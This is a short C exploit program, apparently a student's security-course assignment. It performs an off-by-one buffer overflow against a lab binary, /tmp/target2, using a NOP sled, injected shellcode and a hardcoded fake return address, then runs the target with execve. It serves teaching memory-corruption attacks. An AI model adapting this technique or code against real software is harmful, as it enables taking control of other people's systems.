/* sploit2.c
 *
 * William Ersing
 * CSC 450
 *
 * This buffer overflow exploit takes advantage of a flaw in target2.c
 * The flaw is found in the for loop of the nstrcpy function,
 * where i <= len. This flaw allows the buffer to be overflowed by one byte.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFFSIZE 202                // 200 buffer + 1 overflow + 1 NULL = 202

int main(void){
  char *args[3];
  char *env[1];
  char buf[BUFFSIZE];

  memset(buf, 0x90, BUFFSIZE - 1);      // Fill exploit string with NOPs
  memcpy(buf, shellcode, strlen(shellcode));    // Place shellcode at start of exploit string 

  *(unsigned long *)(buf + 196) = 0xbffffce4;   // Place fake eip at end of exploit string
  *(unsigned long *)(buf + 200) = 0xa4;     // Point overflow byte to fake eip

  buf[BUFFSIZE - 1] = 0;            // NULL terminate exploit string

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if(0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
